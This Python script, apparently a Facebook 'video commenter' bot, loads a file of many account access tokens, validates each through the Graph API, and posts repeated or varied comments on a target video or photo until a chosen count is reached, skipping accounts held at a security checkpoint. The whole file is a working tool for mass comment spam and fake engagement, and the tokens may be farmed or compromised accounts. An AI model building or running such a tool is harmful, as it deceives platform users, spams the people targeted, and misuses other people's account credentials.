import requests
import re

# Extract media ID from Facebook URL
def Video_Extractid(url):
    match = re.search(r'/(videos|photos)/(\d+)', url)
    return match.group(2) if match else None

# Load data (tokens) from file
def load_data(filepath):
    try:
        with open(filepath, 'r') as file:
            return [line.strip() for line in file.readlines()]
    except Exception as e:
        print(f"[ERROR] Failed to load data: {e}")
        return []

# Validate access token before posting a comment
def validate_access_token(access_token):
    validation_url = f"https://graph.facebook.com/debug_token?input_token={access_token}&access_token={access_token}"
    response = requests.get(validation_url)
    
    if response.status_code == 200:
        data = response.json().get("data", {})
        if data.get("is_valid"):
            return True
        else:
            print(f"[ERROR] Access token is invalid: {data}")
            return False
    else:
        print(f"[ERROR] Failed to validate access token. Response: {response.json()}")
        return False

# Perform the comment request
def perform_comment(media_id, comment_text, access_token):
    try:
        url = f'https://graph.facebook.com/v18.0/{media_id}/comments'
        params = {'access_token': access_token, 'message': comment_text}
        response = requests.post(url, params=params)

        if response.status_code == 200:
            print(f"[SUCCESS] Commented: '{comment_text}' on media ID '{media_id}'.")
            return True  # Indicate that the comment was posted successfully
        else:
            error_data = response.json()
            if error_data['error']['code'] == 190 and error_data['error'].get('error_subcode') == 490:
                print(f"[ERROR] Checkpoint required for this account. Token: {access_token[:10]}... skipping this token.")
                return False  # Skip this token
            else:
                print(f"[ERROR] Failed to post comment on media ID '{media_id}'. Response: {error_data}")
                return False  # Indicate failure to post
    except requests.exceptions.RequestException as error:
        print(f"[EXCEPTION] An error occurred during the request: {error}")
        return False  # Indicate failure

# Perform the comment request repeatedly using all tokens
def post_same_comment(url, comment_text, num_comments):
    media_id = Video_Extractid(url)
    if not media_id:
        print("[ERROR] Invalid URL or unable to extract media ID.")
        return

    access_tokens = load_data('/sdcard/Test/toka.txt')  # Load access tokens

    comment_count = 0

    while comment_count < num_comments:
        for access_token in access_tokens:
            if validate_access_token(access_token):
                # Post the same comment each time
                if perform_comment(media_id, comment_text, access_token):  # Check if the comment was posted successfully
                    comment_count += 1
                if comment_count >= num_comments:
                    print(f"Reached the limit of {num_comments} comments.")
                    return
            else:
                print(f"[SKIP] Skipping invalid access token: {access_token[:10]}...")

    print(f"Total comments posted: {comment_count}")

# Post different comments using all tokens
def post_different_comments(url, num_comments):
    media_id = Video_Extractid(url)
    if not media_id:
        print("[ERROR] Invalid URL or unable to extract media ID.")
        return

    access_tokens = load_data('/sdcard/Test/toka.txt')  # Load access tokens

    # Prompt user to input all the comments upfront
    comments = []
    for i in range(num_comments):
        comment = input(f"Enter comment {i + 1}: ")
        comments.append(comment)

    comment_count = 0

    while comment_count < num_comments:
        for access_token in access_tokens:
            if validate_access_token(access_token):
                # Post the corresponding comment from the list
                comment_text = comments[comment_count]
                if perform_comment(media_id, comment_text, access_token):  # Check if the comment was posted successfully
                    comment_count += 1
                if comment_count >= num_comments:
                    print(f"Reached the limit of {num_comments} comments.")
                    return
            else:
                print(f"[SKIP] Skipping invalid access token: {access_token[:10]}...")

    print(f"Total different comments posted: {comment_count}")

def main_menu():
    print("\n=== Facebook Video Commenter ===")
    print("1. Post the same comments")
    print("2. Post different comments")
    choice = input("\nEnter your choice (1 or 2): ")

    url = input("Enter the media URL: ")
    
    if choice == '1':
        comment_text = input("Enter the comment text: ")
        num_comments = int(input("Enter the number of comments to post: "))
        post_same_comment(url, comment_text, num_comments)
    elif choice == '2':
        num_comments = int(input("Enter the number of comments to post: "))
        post_different_comments(url, num_comments)
    else:
        print("[ERROR] Invalid choice. Please select either 1 or 2.")

if __name__ == "__main__":
    main_menu()
